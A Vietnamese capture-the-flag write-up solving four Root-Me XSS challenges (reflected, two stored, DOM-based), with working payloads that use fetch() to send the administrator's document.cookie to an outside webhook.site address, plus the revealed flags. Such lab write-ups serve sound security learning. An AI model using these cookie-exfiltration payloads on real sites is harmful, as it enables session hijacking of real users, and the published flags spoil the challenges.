# XSS-Reflected
### Challenge
Link: http://challenge01.root-me.org/web-client/ch26/
### Hint
> alert(’xtra stupid security’);

> Find a way to steal the administrator’s cookie.
Be careful, this administrator is aware of info security and he does not click on strange links that he could receive.
### Solution
Đầu tiên, em kiểm tra các tính năng của trang web thì thấy ở trang `contact` có một form cho phép nhập thông tin.
Tuy nhiên lại có dòng:
>Like most businesses, nobody actually checks any of this feedback, but in order to look like we care, we have made a totally useless form you can fill out.`

Nghĩa là form này vô dụng. Em kiểm tra bằng cách nhập thông tin như sau:

![](https://i.imgur.com/j48yzGR.png)

Nhấn send thì không thấy có gì xảy ra, lại có đoạn 
>We have automatically printed out your feedback and burned it to provide our offices with warmth during the harsh Nordic winter
(seriously, nobody wants to read your rambling).`

Vậy nên form này vô dụng thật.
Để ý URL, em thấy có tham số `p` nhận giá trị là trang được truy cập tới. Thử thay đổi giá trị của `p` thì em được chuyển hướng tới trang sau:

![](https://i.imgur.com/CsdmpAT.png)

Thay đổi giá trị của `p` thành `' onclick='alert(1)` được URL encode thì được kết quả như sau:

![](https://i.imgur.com/qReFsgW.png)

Vậy ta có thể khai thác XSS từ đây.
Để lấy được cookie của admin, em fetch đến [Webhook](https://webhook.site/#!/16dfa276-986b-4d49-9ae0-8cca659780d1/a64570e2-7695-4bcc-ab94-fe084f9114b7/1) với payload sau:
>autofocus onfocus='fetch(`https://webhook.site/16dfa276-986b-4d49-9ae0-8cca659780d1?cookie=${document.cookie}`) 

![](https://i.imgur.com/z7mwHeC.png)

Em đã chuyển hướng được đến trang [Webhook](https://webhook.site/#!/16dfa276-986b-4d49-9ae0-8cca659780d1/a64570e2-7695-4bcc-ab94-fe084f9114b7/1). Giờ em chỉ cần chọn`Report to administrator` rồi đợi kết quả từ Webhook.

![](https://i.imgur.com/RF3vLEQ.png)

### Flag
`r3fL3ct3D_XsS_fTw`
___
# XSS - Stored 1
### Challenge
Link: http://challenge01.root-me.org/web-client/ch18/
### Hint 
> So easy to sploit

> Steal the administrator session cookie and use it to validate this chall.
### Solution
Vào challenge, xuất hiện một trang cho phép nhập các thông tin `title` và `message`, sau khi nhập và nhấn `send` thì những thông tin này sẽ được lưu lại và hiển thị với người dùng.
Em thử nhập vào ô `messsage` đoạn `<script>alert(1)</script>` thì thấy dòng này được thực thi như sau:

![](https://i.imgur.com/XCLxm38.png)

Vậy trang này dính Stored XSS. Để lấy được cookie của admin, em nhập `message` như sau: 
><script>fetch(`https://webhook.site/16dfa276-986b-4d49-9ae0-8cca659780d1?${document.cookie}`)</script>

Sau đó sang trang [Webhook](https://) đợi, em nhận được `ADMIN_COOKIE`. Theo statement thì cookie này cũng chính là flag.

![](https://i.imgur.com/DAwz6CJ.png)

### Flag
`NkI9qe4cdLIO2P7MIsWS8ofD6`
___
# XSS - Stored 2
### Challenge
Link: http://challenge01.root-me.org/web-client/ch19/
### Hint
> Steal the administrator session’s cookie and go in the admin section.
### Solution
Vào challenge, xuất hiện một trang cho phép nhập các thông tin `title` và `message`, sau khi nhập và nhấn `send` thì những thông tin này sẽ được lưu lại và hiển thị với người dùng.
Em thử nhập vào ô `messsage` đoạn `<script>alert(1)</script>`, nhưng không như bài trước, script này không được thực thi T_T

![](https://i.imgur.com/WjmnotZ.png)

Mặt khác, comment hiển thị có thêm `status:invite`, nằm trong thẻ `<i>` ở source code.
Vào Burpsuit, em thấy ở request có cookie `status=invite`. Thử thay đổi value của cookie `status` rồi send request thì thấy class của thẻ `<i>` được trả về cũng thay đổi theo.

![](https://i.imgur.com/qoZ2pQm.png)

Vậy ta có thể khai thác XSS từ phần cookie này.
Tương tự các bài trước, em tạo payload fetch đến Webhook để admin truy cập vào. Thay đổi value Cookie staus thành payload này. Khi send request, script chèn vào sẽ được thực thi. 

![](https://i.imgur.com/hVxNuI1.png)

Vào Webhook đợi admin truy cập, em có được cookie của admin.

![](https://i.imgur.com/zvxTMqJ.png)

Theo Statement, em dùng cookie có được truy cập vào `admin section` để lấy flag.

![](https://i.imgur.com/nXPKCaG.png)

### Flag
`E5HKEGyCXQVsYaehaqeJs0AfV`
___
# XSS DOM Based - Introduction
### Challenge
Link: http://challenge01.root-me.org/web-client/ch32/
### Hint
> An introduction to DOM Based Cross Site Scripting attacks

> Steal the admin’s session cookie.

### Solution
Vào challenge, em nhập vào số bất kỳ và đương nhiên, kết quả đều sai.

![](https://i.imgur.com/u40CbCk.png)

Xem source code em thấy đoạn script sau:
```
<script>
var random = Math.random() * (99);
var number = '13';
if(random == number) {
    document.getElementById('state').style.color = 'green';
    document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
}
else{
    document.getElementById('state').style.color = 'red';
    document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
}
</script>
```

Theo đoạn mã này thì kể cả em có may mắn nhập số trùng với số của hàm `random()` cũng sẽ không nhận được flag.
Em để ý thấy số mình nhập vào sẽ được truyền vào biến number. Vì vậy em thử nhập thêm đoạn mã sau vào URL: `%27;%20alert(1);%20//` và được kết quả:

    <script>
    var random = Math.random() * (99);
    var number = ''; alert(1); //';
    if(random == number) {
        document.getElementById('state').style.color = 'green';
        document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
    }
    else{
        document.getElementById('state').style.color = 'red';
        document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
    }
    </script>
    
![](https://i.imgur.com/uXfLwhw.png)

Để lấy được cookie của admin, em tạo link fetch đến Webhook như sau:
> %27;%20fetch(`https://webhook.site/16dfa276-986b-4d49-9ae0-8cca659780d1?${document.cookie}`)//
Em thử thì thấy chuyển đến Webhook thành công nên nhập link trên vào trang `/contact.php`.

![](https://i.imgur.com/ruybTIv.png)

Sau đó, ở Webhook, em đã nhận được flag.
### Flag
`rootme{XSS_D0M_BaSed_InTr0}`




